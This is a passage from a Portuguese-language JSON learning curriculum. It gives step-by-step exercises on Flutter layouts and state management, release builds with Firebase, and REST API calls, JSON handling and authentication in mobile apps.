                                  "learningObjective": "Personalizar desenhos vetoriais e introduzir animações controladas.",
                                  "commonMistakes": [
                                    "Não chamar super.paint, deixando canvas vazio.",
                                    "Esquecer dispose do controller, causando memory leak."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar temas e responsividade global",
                                  "subSteps": [
                                    "Definir ThemeData no MaterialApp com primarySwatch: Colors.blue.",
                                    "Usar MediaQuery para tamanhos responsivos: MediaQuery.of(context).size.width.",
                                    "Testar em diferentes dispositivos/emuladores.",
                                    "Adicionar animações responsivas baseadas em tema."
                                  ],
                                  "verification": "Alterar tema e confirmar aplicação em todos os widgets; testar em múltiplos tamanhos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Docs ThemeData: https://api.flutter.dev/flutter/material/ThemeData-class.html"
                                  ],
                                  "tips": [
                                    "Use Theme.of(context) para cores dinâmicas.",
                                    "LayoutBuilder para rebuilds baseados em constraints."
                                  ],
                                  "learningObjective": "Criar interfaces consistentes e adaptáveis a diferentes contextos.",
                                  "commonMistakes": [
                                    "Hardcode tamanhos fixos, quebrando responsividade.",
                                    "Não propagar tema para widgets customizados."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app de catálogo de produtos: Scaffold com AppBar('Catálogo'), body com Column(Row de filtros, Expanded(ListView de produtos com CustomPaint para ícones customizados)), animação de fade-in nos itens usando AnimatedBuilder, e tema azul escuro para modo noturno.",
                              "finalVerifications": [
                                "O app roda sem erros em Android e iOS emuladores.",
                                "Layouts se adaptam a rotações e tamanhos de tela diferentes.",
                                "ListView scrolla suavemente com 100+ itens.",
                                "Animações iniciam e param corretamente.",
                                "CustomPaint renderiza formas personalizadas sem artefatos.",
                                "Tema é aplicado consistentemente em todos os elementos."
                              ],
                              "assessmentCriteria": [
                                "Uso correto de Scaffold como root com AppBar funcional (20%).",
                                "Layouts responsivos com Column/Row sem overflow (25%).",
                                "ListView eficiente com builder e separadores (20%).",
                                "CustomPaint com desenhos vetoriais precisos (15%).",
                                "Animações suaves via AnimatedBuilder (10%).",
                                "Tema global e MediaQuery para responsividade (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Design UI/UX: Princípios de layout e hierarquia visual.",
                                "Programação Orientada a Objetos: Herança em CustomPainter.",
                                "Matemática: Cálculos de Offset e transformações em Canvas.",
                                "Desenvolvimento Web: Paralelos com Flexbox em CSS.",
                                "Acessibilidade: Uso de Semantics para screen readers."
                              ],
                              "realWorldApplication": "Em apps como e-commerce (listas de produtos com filtros responsivos), redes sociais (feeds scrolláveis com animações), ou dashboards (layouts customizados com gráficos via CustomPaint), garantindo UX fluida em múltiplas plataformas."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.3.1"
                            ]
                          },
                          {
                            "id": "26.3.1.3.3",
                            "name": "Gerenciar estado",
                            "description": "Implementar gerenciamento de estado com setState, Provider ou Riverpod, lidando com chamadas assíncronas via FutureBuilder e StreamBuilder para dados dinâmicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Implementar gerenciamento de estado local com setState",
                                  "subSteps": [
                                    "Crie um novo projeto Flutter usando 'flutter create meu_app'.",
                                    "Converta o MyHomePage para StatefulWidget e adicione uma variável de estado int counter = 0.",
                                    "Implemente dois botões ElevatedButton para incrementar e decrementar o counter usando setState(() { counter++; }).",
                                    "Exiba o valor do counter em um Text widget dentro do build method.",
                                    "Teste o app em um emulador para verificar atualizações em tempo real."
                                  ],
                                  "verification": "Execute o app e confirme que o contador atualiza corretamente ao pressionar os botões sem erros no console.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Flutter SDK instalado",
                                    "VS Code ou Android Studio",
                                    "Emulador Android/iOS"
                                  ],
                                  "tips": "Use setState apenas para mudanças simples e locais; evite lógica complexa dentro dele.",
                                  "learningObjective": "Dominar o uso de setState em StatefulWidgets para gerenciar estado mutável local.",
                                  "commonMistakes": [
                                    "Modificar a variável de estado diretamente sem setState",
                                    "Chamar setState em contextos assíncronos sem precauções",
                                    "Esquecer de declarar a variável como late ou inicializar incorretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Provider para gerenciamento de estado compartilhado",
                                  "subSteps": [
                                    "Adicione 'provider: ^6.1.2' ao pubspec.yaml e execute 'flutter pub get'.",
                                    "Crie uma classe CounterModel extends ChangeNotifier com métodos increment e decrement que notificam listeners.",
                                    "Wrap o MaterialApp com ChangeNotifierProvider<CounterModel>(create: (_) => CounterModel()).",
                                    "No widget consumidor, use Consumer<CounterModel> para acessar counter e botões.",
                                    "Teste compartilhando o estado entre duas telas navegáveis."
                                  ],
                                  "verification": "Navegue entre telas e verifique se o estado do contador persiste e atualiza em ambos os lugares.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Dependência Provider no pubspec.yaml",
                                    "Documentação oficial do Provider",
                                    "Emulador para testes"
                                  ],
                                  "tips": "Sempre chame notifyListeners() após alterar o estado no notifier.",
                                  "learningObjective": "Implementar Provider para estado reativo compartilhado entre múltiplos widgets.",
                                  "commonMistakes": [
                                    "Esquecer notifyListeners()",
                                    "Usar Provider.of sem listen: false em contextos não rebuild",
                                    "Não wrappar o widget raiz corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar chamadas assíncronas com FutureBuilder",
                                  "subSteps": [
                                    "Crie uma função Future<List<String>> fetchData() async que simula uma API com delay(2s) e retorna uma lista.",
                                    "Use FutureBuilder<List<String>> no build, com initialData: [], snapshot.connectionState para loading/error/success.",
                                    "Exiba CircularProgressIndicator em loading, Text('Erro') em error, e ListView.builder em hasData.",
                                    "Integre com Provider para atualizar estado após fetch.",
                                    "Teste reconectando o Future com um botão refresh."
                                  ],
                                  "verification": "App mostra loading, carrega dados, trata erros e atualiza UI sem crashes.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Pacote http para simular API real (opcional)",
                                    "Documentação FutureBuilder",
                                    "DartPad para testes rápidos"
                                  ],
                                  "tips": "Use snapshot.hasError e snapshot.hasData para estados condicionais precisos.",
                                  "learningObjective": "Lidar com operações Future assíncronas únicas usando FutureBuilder de forma robusta.",
                                  "commonMistakes": [
                                    "Não tratar snapshot.connectionState == waiting",
                                    "Recarregar Future sem key única",
                                    "Ignorar erros com try-catch inadequado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar StreamBuilder para dados dinâmicos em tempo real",
                                  "subSteps": [
                                    "Crie um StreamController<String> _controller = StreamController.broadcast(); e método sinkData(String data).",
                                    "Converta para StreamBuilder<String> com stream: _controller.stream, exibindo dados em ListView.",
                                    "Adicione botões para sink eventos periódicos (Timer) simulando updates reais.",
                                    "Integre com Riverpod: adicione 'flutter_riverpod: ^2.5.1', crie StreamProvider e use ref.watch.",
                                    "Teste fechando o stream no dispose para evitar memory leaks."
                                  ],
                                  "verification": "Dados atualizam em tempo real no UI ao sinkar eventos, sem vazamentos de memória.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Dependência Riverpod (opcional para avançado)",
                                    "Documentação StreamBuilder e Riverpod",
                                    "Ferramenta Flutter Inspector"
                                  ],
                                  "tips": "Use StreamController.broadcast() para múltiplos listeners; feche no dispose.",
                                  "learningObjective": "Gerenciar streams contínuos com StreamBuilder e introduzir Riverpod como alternativa escalável.",
                                  "commonMistakes": [
                                    "Não chamar controller.close() no dispose",
                                    "Misturar Future e Stream sem necessidade",
                                    "Ignorar backpressure em streams intensos"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app de lista de tarefas (Todo List) onde: tarefas são gerenciadas com Provider (CounterModel para contagem), carregadas de uma API mock com FutureBuilder (loading/error/success), e atualizadas em tempo real via StreamBuilder/Riverpod (novas tarefas via WebSocket simulado). Inclua botões CRUD e navegação entre Home e Detalhes.",
                              "finalVerifications": [
                                "App compila e roda sem erros em múltiplas plataformas (Android/iOS).",
                                "Estado atualiza reativamente em todos os widgets consumidores.",
                                "FutureBuilder gerencia loading, erro e dados corretamente.",
                                "StreamBuilder responde a eventos em <1s sem lags.",
                                "Riverpod alternativa funciona sem Provider legacy.",
                                "Nenhum memory leak detectado no Flutter Inspector."
                              ],
                              "assessmentCriteria": [
                                "Código limpo, modular e comentado (90%+ cobertura de casos).",
                                "Uso correto de setState apenas localmente; Provider/Stream para global.",
                                "Tratamento completo de estados assíncronos (loading/error/success).",
                                "Eficiência: rebuilds mínimos via Consumer/Selector.",
                                "Testes unitários para notifiers e builders (mínimo 3).",
                                "Integração fluida entre ferramentas sem conflitos."
                              ],
                              "crossCurricularConnections": [
                                "Programação Reativa: Conceitos de RxDart e observables.",
                                "Padrões de Design: MVVM com Provider/Riverpod.",
                                "Redes e APIs: Integração com HTTP/Dio para dados reais.",
                                "Banco de Dados: Persistência com Hive/SQLite + streams.",
                                "Testes e Qualidade: Unit/Widget tests para estado."
                              ],
                              "realWorldApplication": "Em apps de e-commerce (carrinho dinâmico com updates de estoque via Stream), chats (mensagens em tempo real com StreamBuilder), dashboards financeiros (dados de API com FutureBuilder) ou redes sociais (feeds infinitos com estado global via Riverpod)."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.3.2"
                            ]
                          },
                          {
                            "id": "26.3.1.3.4",
                            "name": "Deploy e otimização",
                            "description": "Compilar apps para release em Android e iOS com flutter build, integrar Firebase para analytics e push notifications, e otimizar performance com perfilação via Flutter DevTools.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de build para Android e iOS",
                                  "subSteps": [
                                    "Instalar e configurar Android SDK e Xcode (para iOS).",
                                    "Gerar chaves de assinatura: keystore para Android e certificado para iOS.",
                                    "Configurar arquivos gradle.properties, android/app/build.gradle e ios/Runner.xcworkspace.",
                                    "Executar flutter doctor para verificar dependências.",
                                    "Testar build de debug em emuladores físicos."
                                  ],
                                  "verification": "Executar 'flutter doctor -v' sem erros e builds de debug bem-sucedidos em emuladores.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Android Studio, Xcode, Flutter SDK, contas developer Android/iOS.",
                                  "tips": "Use 'flutter create --platforms android,ios' para projetos iniciais e armazene chaves em local seguro.",
                                  "learningObjective": "Entender e preparar configurações essenciais para builds de release multiplataforma.",
                                  "commonMistakes": "Esquecer de aceitar licenças Android ou não configurar bundle ID corretamente no iOS."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar e gerar APKs/IPAs para release",
                                  "subSteps": [
                                    "Executar 'flutter build apk --release' para Android.",
                                    "Executar 'flutter build ios --release' para iOS.",
                                    "Otimizar build com 'flutter build appbundle --release' para Android App Bundle.",
                                    "Assinar os builds com chaves geradas.",
                                    "Testar installs em dispositivos reais."
                                  ],
                                  "verification": "Gerar arquivos APK/AAB/IPA válidos e instalá-los em dispositivos sem crashes.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": "Dispositivos Android/iOS físicos, chaves de assinatura.",
                                  "tips": "Use '--split-per-abi' para APKs menores e verifique logs com 'flutter logs'.",
                                  "learningObjective": "Dominar comandos de build para gerar artefatos de release prontos para stores.",
                                  "commonMistakes": "Build sem --release (gera debug) ou chaves inválidas causando falha na assinatura."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Firebase no projeto Flutter",
                                  "subSteps": [
                                    "Criar projeto no Firebase Console e adicionar apps Android/iOS.",
                                    "Instalar firebase_core e baixar google-services.json/plist.",
                                    "Configurar firebase_options.dart com 'flutterfire configure'.",
                                    "Inicializar Firebase no main.dart com await Firebase.initializeApp().",
                                    "Testar conexão com Firebase emuladores."
                                  ],
                                  "verification": "Console loga 'Firebase initialized' e queries básicas funcionam.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Conta Firebase, FlutterFire CLI.",
                                  "tips": "Use FlutterFire CLI para automação e teste em modo debug primeiro.",
                                  "learningObjective": "Configurar Firebase como backend para apps Flutter cross-platform.",
                                  "commonMistakes": "Colocar arquivos google-services em pastas erradas ou esquecer de adicionar plugins no pubspec.yaml."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar analytics e push notifications com Firebase",
                                  "subSteps": [
                                    "Adicionar firebase_analytics e firebase_messaging.",
                                    "Configurar Analytics: logEvent() para eventos customizados.",
                                    "Configurar push: requestPermission(), getToken() e onMessage handler.",
                                    "Testar analytics no Firebase Console e push via FCM.",
                                    "Integrar background messaging com firebase_messaging_background."
                                  ],
                                  "verification": "Eventos aparecem no dashboard Analytics e push notifications são recebidas em dispositivos.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Firebase Console, dispositivos para teste de push.",
                                  "tips": "Use Firebase Test Lab para testes automatizados de push.",
                                  "learningObjective": "Implementar tracking de usuário e comunicações em tempo real.",
                                  "commonMistakes": "Não lidar com tokens em background ou permissões negadas."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar performance com Flutter DevTools",
                                  "subSteps": [
                                    "Executar 'flutter run --profile' e abrir DevTools.",
                                    "Analisar CPU Profiler para bottlenecks em frames.",
                                    "Usar Memory tab para detectar leaks.",
                                    "Otimizar widgets com Widget Inspector e Performance overlay.",
                                    "Aplicar fixes: const constructors, ListView.builder, evitar rebuilds desnecessários."
                                  ],
                                  "verification": "FPS > 60, memória estável e CPU usage reduzida em 20-30%.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Flutter DevTools, app em profile mode.",
                                  "tips": "Ative 'Track Widget Rebuilds' no Inspector para debug.",
                                  "learningObjective": "Identificar e corrigir gargalos de performance usando ferramentas oficiais.",
                                  "commonMistakes": "Analisar em debug mode (não reflete release) ou ignorar rebuilds de listas grandes."
                                }
                              ],
                              "practicalExample": "Desenvolva um app de lista de tarefas Flutter, compile para Android/iOS release, integre Firebase para rastrear criações de tarefas (analytics) e envios de lembretes (push), otimize para rodar fluido em dispositivos low-end medindo FPS no DevTools.",
                              "finalVerifications": [
                                "APK/IPA gerados instalam e rodam sem erros em dispositivos reais.",
                                "Analytics eventos logados visíveis no Firebase Console em <1h.",
                                "Push notifications funcionam em foreground/background.",
                                "Performance: FPS médio >55, sem memory leaks em sessões de 10min.",
                                "Build size <50MB para app simples.",
                                "Integração cross-platform sem diferenças visíveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos comandos de build e configurações (sem erros de assinatura).",
                                "Funcionalidade completa de Firebase (analytics + push testados).",
                                "Melhoria mensurável de performance pré/pós-otimização (>20%).",
                                "Código limpo com comentários e estrutura modular.",
                                "Documentação de passos e troubleshooting.",
                                "Compatibilidade Android/iOS sem adaptações manuais."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: CI/CD com GitHub Actions para automação de builds.",
                                "Cloud Computing: Uso de Firebase como PaaS para backend.",
                                "Engenharia de Software: Práticas de profiling e otimização.",
                                "Segurança: Gerenciamento de chaves e permissões de notificações."
                              ],
                              "realWorldApplication": "Lançar apps profissionais nas Google Play/App Store, monitorar uso real via analytics para iterações, enviar updates via push para retenção de usuários, e garantir performance escalável para milhões de downloads."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.3.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.4",
                    "name": "Integração com APIs e Serviços Web",
                    "description": "Conexão de apps móveis com backends na nuvem via REST e WebSockets.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.4.1",
                        "name": "APIs REST para Integração de Apps Móveis",
                        "description": "Conceito fundamental sobre o uso de APIs RESTful para conectar aplicações móveis a backends na nuvem, incluindo métodos HTTP, endpoints e manipulação de dados JSON.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.1.1",
                            "name": "Realizar requisições HTTP em apps móveis",
                            "description": "Implementar chamadas GET, POST, PUT e DELETE usando bibliotecas como Retrofit (Android) ou URLSession (iOS) para consumir APIs REST de backends na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e adicionar bibliotecas para requisições HTTP",
                                  "subSteps": [
                                    "Criar um novo projeto Android no Android Studio ou iOS no Xcode.",
                                    "Para Android: Adicionar dependências Retrofit, Gson e OkHttp no build.gradle (Module: app): implementation 'com.squareup.retrofit2:retrofit:2.9.0', etc.",
                                    "Para iOS: Importar Foundation e preparar URLSession; instalar Alamofire via Swift Package Manager se desejado.",
                                    "Adicionar permissão de internet: <uses-permission android:name=\"android.permission.INTERNET\" /> no AndroidManifest.xml (Android).",
                                    "Configurar ProGuard ou build settings para evitar ofuscação em produção."
                                  ],
                                  "verification": "Projeto compila sem erros e as bibliotecas são reconhecidas no IDE (sem erros de import).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Android Studio ou Xcode",
                                    "Documentação oficial Retrofit (retrofit.com) e Apple URLSession (developer.apple.com)",
                                    "API de teste como JSONPlaceholder (jsonplaceholder.typicode.com)"
                                  ],
                                  "tips": "Sempre sincronize o Gradle após adicionar dependências no Android; teste em emulador/simulador primeiro.",
                                  "learningObjective": "Preparar o projeto mobile para integração com APIs REST usando bibliotecas nativas.",
                                  "commonMistakes": [
                                    "Esquecer de sincronizar Gradle ou adicionar repositórios Maven no Android.",
                                    "Não declarar permissão de internet, causando NetworkOnMainThreadException.",
                                    "Usar versões desatualizadas de bibliotecas incompatíveis com o SDK."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir modelos de dados e interface da API",
                                  "subSteps": [
                                    "Analisar a estrutura JSON da API de exemplo (ex: posts com id, title, body).",
                                    "Para Android: Criar classes POJO como Post.java com @SerializedName para campos JSON.",
                                    "Para iOS: Definir structs com Codable protocol, ex: struct Post: Codable { var id: Int; var title: String }.",
                                    "Definir interface Retrofit: @GET(\"posts\"), Call<List<Post>> getPosts(); ou closure para URLSession.",
                                    "Criar instância do Retrofit com base URL e Gson converter."
                                  ],
                                  "verification": "Modelos serializam/deserializam JSON corretamente em testes unitários simples.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código integrado ao IDE",
                                    "Ferramenta como Postman para inspecionar APIs",
                                    "Documentação Gson e Codable"
                                  ],
                                  "tips": "Use nomes de propriedades iguais aos JSON para evitar anotações; teste parsing com JSON estático primeiro.",
                                  "learningObjective": "Mapear respostas JSON da API para objetos nativos da linguagem mobile.",
                                  "commonMistakes": [
                                    "Mismatch entre nomes de campos JSON e propriedades (sem @SerializedName ou codingKeys).",
                                    "Esquecer tipos opcionais em Swift para campos nulos.",
                                    "Definir base URL sem '/' final, causando erros de path."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar requisição GET e exibir dados na UI",
                                  "subSteps": [
                                    "Criar serviço API com Retrofit.create(ApiInterface.class) ou URLSession.shared.dataTask.",
                                    "Executar chamada assíncrona: enqueue para Retrofit ou resume() para URLSession.",
                                    "Parse resposta JSON para lista de objetos e atualizar UI em thread principal (runOnUiThread ou DispatchQueue.main).",
                                    "Para Android: Usar RecyclerView para listar itens; iOS: UITableView.",
                                    "Adicionar loading indicator e log de resposta no onResponse/onSuccess."
                                  ],
                                  "verification": "App exibe lista de dados da API ao carregar (ex: lista de posts do JSONPlaceholder).",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Emulador Android/iOS Simulator",
                                    "JSONPlaceholder API",
                                    "Bibliotecas de UI como RecyclerView ou UIKit"
                                  ],
                                  "tips": "Sempre use callbacks ou async/await para evitar bloquear UI; log requests com Log.d ou print.",
                                  "learningObjective": "Realizar e processar requisições GET de forma assíncrona, integrando dados na interface.",
                                  "commonMistakes": [
                                    "Executar rede na main thread, crashando o app.",
                                    "Não tratar respostas vazias ou 404.",
                                    "Atualizar UI de background thread sem dispatch."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar POST, PUT, DELETE e tratamento de erros",
                                  "subSteps": [
                                    "Definir métodos @POST, @PUT, @DELETE na interface com @Body ou parâmetros.",
                                    "Implementar chamadas: POST novo item, PUT editar (com ID), DELETE remover.",
                                    "Adicionar tratamento de erros: onFailure (Retrofit) ou check statusCode (URLSession), exibir Toast/Alert.",
                                    "Integrar botões na UI para disparar ações e recarregar lista após sucesso.",
                                    "Testar com API mock: POST cria, PUT atualiza, DELETE remove."
                                  ],
                                  "verification": "POST cria item novo, PUT edita existente, DELETE remove, com feedback visual de sucesso/erro.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Mesma API de teste",
                                    "Ferramentas de debug como Charles Proxy ou Xcode Network Link Conditioner"
                                  ],
                                  "tips": "Use @FieldMap para queries dinâmicos; valide dados antes de enviar.",
                                  "learningObjective": "Dominar operações CRUD HTTP com gerenciamento robusto de erros e feedback.",
                                  "commonMistakes": [
                                    "Enviar body vazio em POST/PUT.",
                                    "Confundir PUT (update total) com PATCH (parcial).",
                                    "Ignorar códigos HTTP como 401/500 sem retry logic."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app 'TaskManager Mobile' que consome JSONPlaceholder API: lista tarefas (GET /todos), adiciona nova (POST), marca como completa (PUT), deleta (DELETE). Exiba em lista com botões ação, loading spinner e alerts de erro.",
                              "finalVerifications": [
                                "GET carrega e exibe lista completa sem crashes.",
                                "POST cria item novo e atualiza lista automaticamente.",
                                "PUT edita item selecionado com sucesso.",
                                "DELETE remove item e confirma visualmente.",
                                "Erros de rede/offline mostram mensagem amigável.",
                                "App funciona em emulador e device real."
                              ],
                              "assessmentCriteria": [
                                "Código modular com separação de concerns (API service, models, UI).",
                                "Requisições assíncronas sem bloqueio de UI.",
                                "Tratamento completo de erros HTTP (4xx/5xx).",
                                "Modelos de dados parseiam JSON corretamente em ambos cenários.",
                                "UI responsiva com feedback visual (loading, success/error).",
                                "Comentários e boas práticas (ex: null safety)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP/HTTPS e status codes.",
                                "Banco de Dados: Mapeamento objeto-relacional similar a ORM.",
                                "Segurança da Informação: Headers de autenticação (ex: Bearer Token).",
                                "Desenvolvimento Web: Consumo de APIs RESTful.",
                                "Qualidade de Software: Testes unitários para parsing e chamadas."
                              ],
                              "realWorldApplication": "Apps como WhatsApp usam requisições HTTP para sincronizar mensagens em tempo real com servidores na nuvem, ou e-commerces como Amazon Mobile para carrinho de compras (POST itens), atualizações de estoque (PUT) e remoções."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.2",
                            "name": "Manipular respostas JSON",
                            "description": "Parsear e serializar dados JSON recebidos de APIs REST em objetos nativos da plataforma móvel, lidando com erros de parsing e validação de dados.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar requisição HTTP e receber resposta JSON",
                                  "subSteps": [
                                    "Instalar biblioteca HTTP (ex: http no Flutter ou URLSession no Swift)",
                                    "Criar função assíncrona para realizar requisição GET/POST a uma API REST",
                                    "Verificar código de status HTTP (200 OK) e cabeçalhos (Content-Type: application/json)",
                                    "Extrair corpo da resposta como string JSON",
                                    "Registrar logs para depuração da resposta bruta"
                                  ],
                                  "verification": "String JSON recebida e logada sem erros de rede, com status 200 confirmado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "IDE (VS Code/Android Studio), documentação da biblioteca HTTP, ferramenta como Postman para simular API.",
                                  "tips": "Use variáveis de ambiente para URLs de API durante desenvolvimento.",
                                  "learningObjective": "Dominar o fluxo inicial de integração com APIs REST em apps móveis.",
                                  "commonMistakes": "Ignorar códigos de erro HTTP (ex: 404, 500); não tratar timeouts ou conexões fracas em mobile."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Parsear string JSON para objetos nativos da plataforma",
                                  "subSteps": [
                                    "Definir classes/modelos com construtores fromJson/toJson (ex: User.fromJson(Map<String, dynamic>) em Dart)",
                                    "Usar funções nativas como json.decode() no Dart ou JSONSerialization no Swift",
                                    "Mapear campos aninhados e arrays do JSON para listas de objetos",
                                    "Tratar JSON dinâmico com chaves opcionais usando ? ou nil coalescing",
                                    "Testar parsing com JSON de exemplo válido e inválido"
                                  ],
                                  "verification": "Objeto nativo instanciado corretamente, com todos os campos populados e sem exceções de parsing.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Exemplos de JSON de APIs públicas (JSONPlaceholder), gerador de models online (quicktype.io).",
                                  "tips": "Sempre defina tipos explícitos para campos para evitar erros em runtime.",
                                  "learningObjective": "Converter dados JSON em estruturas tipadas seguras para uso em apps móveis.",
                                  "commonMistakes": "Não mapear corretamente tipos (string para int); esquecer campos aninhados levando a nulls inesperados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Validar dados parseados e lidar com erros de parsing",
                                  "subSteps": [
                                    "Implementar método validate() na classe modelo checando nulls, ranges e formatos (ex: email válido)",
                                    "Usar try-catch para capturar FormatException ou erros de tipo durante parsing",
                                    "Definir validações de negócio (ex: idade > 18, estoque > 0)",
                                    "Retornar erros descritivos ou objetos de erro customizados para UI",
                                    "Integrar notificações de erro no app (snackbars/toasts)"
                                  ],
                                  "verification": "Parsing falha graciosamente com mensagem clara; dados válidos passam em todos os checks.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Bibliotecas de validação (validator.dart ou custom), JSONs malformados para testes.",
                                  "tips": "Valide no modelo para reutilização; use enums para tipos de erro.",
                                  "learningObjective": "Garantir integridade de dados antes de usar no app, prevenindo crashes.",
                                  "commonMistakes": "Validar apenas no frontend sem regras de backend; ignorar validações assíncronas para grandes payloads."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Serializar objetos nativos de volta para JSON",
                                  "subSteps": [
                                    "Implementar método toJson() na classe modelo retornando Map<String, dynamic>",
                                    "Serializar listas e objetos aninhados recursivamente",
                                    "Usar json.encode() para converter Map em string JSON",
                                    "Testar serialização em requisições POST/PUT para envio à API",
                                    "Comparar JSON serializado com original para consistência"
                                  ],
                                  "verification": "String JSON gerada é válida e idêntica à estrutura original quando parseada de volta.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "API de teste com POST (ReqRes.in), linter JSON online.",
                                  "tips": "Evite serializar campos desnecessários para otimizar tamanho do payload.",
                                  "learningObjective": "Manipular ciclo completo de dados entre app e API REST.",
                                  "commonMistakes": "Ciclos infinitos em toJson com referências circulares; esquecer formatação de datas."
                                }
                              ],
                              "practicalExample": "Em um app de delivery móvel (Flutter), faça uma GET para /pedidos, parseie JSON em lista de PedidoModel (com itens, total, status), valide se total > 0 e status válido, então serialize filtros de usuário (localização) para POST /busca-pedidos e exiba resultados em ListView.",
                              "finalVerifications": [
                                "Requisição retorna JSON parseado sem exceções em objetos tipados.",
                                "Validações passam para dados válidos e falham com mensagens para inválidos.",
                                "Serialização produz JSON parseável e idêntico ao original.",
                                "App lida com cenários offline/erro sem crash.",
                                "Performance: parsing < 100ms para payloads médios.",
                                "Logs mostram fluxo completo sem warnings."
                              ],
                              "assessmentCriteria": [
                                "Código modular com models reutilizáveis e métodos fromJson/toJson completos.",
                                "Cobertura total de erros (parsing, validação, rede) com try-catch e user feedback.",
                                "Validações cobrem edge cases (null, empty, malformed JSON).",
                                "Serialização bidirecional testada com asserts.",
                                "Integração assíncrona correta (FutureBuilder ou async/await sem bloqueio UI).",
                                "Código limpo, comentado e segue padrões da plataforma (ex: null-safety em Dart)."
                              ],
                              "crossCurricularConnections": [
                                "Estruturas de Dados: JSON como árvores de dicionários e arrays.",
                                "Programação Assíncrona: Futures/Promises em mobile dev.",
                                "Segurança da Informação: Validação previne injeções e dados maliciosos.",
                                "Design de Software: Modelos com serialização para desacoplamento API/UI."
                              ],
                              "realWorldApplication": "Apps como Uber ou iFood usam isso para parsear respostas de APIs de geolocalização/produtos, validar entregas e enviar atualizações de status serializadas, garantindo funcionamento offline parcial e resiliência a falhas de rede."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.3",
                            "name": "Implementar autenticação em APIs REST",
                            "description": "Integrar mecanismos de autenticação como OAuth 2.0 ou tokens JWT em requisições HTTP para apps móveis, gerenciando tokens de acesso e refresh.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Conceitos Fundamentais de Autenticação OAuth 2.0 e JWT",
                                  "subSteps": [
                                    "Estude o fluxo OAuth 2.0 (Authorization Code Flow para apps móveis)",
                                    "Aprenda estrutura de um token JWT (header, payload, signature)",
                                    "Diferencie tokens de acesso (access token) e refresh token",
                                    "Revise endpoints comuns: /auth/token, /auth/refresh",
                                    "Analise exemplos de fluxos em documentações oficiais (RFC 6749 para OAuth)"
                                  ],
                                  "verification": "Resuma em um diagrama os fluxos OAuth e JWT, identificando papéis de client, auth server e resource server.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação OAuth 2.0 (oauth.net)",
                                    "JWT.io debugger",
                                    "Diagrama de fluxo em papel ou ferramenta como Draw.io"
                                  ],
                                  "tips": "Use JWT.io para decodificar tokens de exemplo e visualizar payloads.",
                                  "learningObjective": "Compreender os mecanismos de autenticação para selecionar o fluxo adequado em apps móveis.",
                                  "commonMistakes": [
                                    "Confundir OAuth 2.0 com JWT (OAuth é protocolo, JWT é formato de token)",
                                    "Ignorar fluxos mobile-friendly como PKCE"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Desenvolvimento e Cliente HTTP",
                                  "subSteps": [
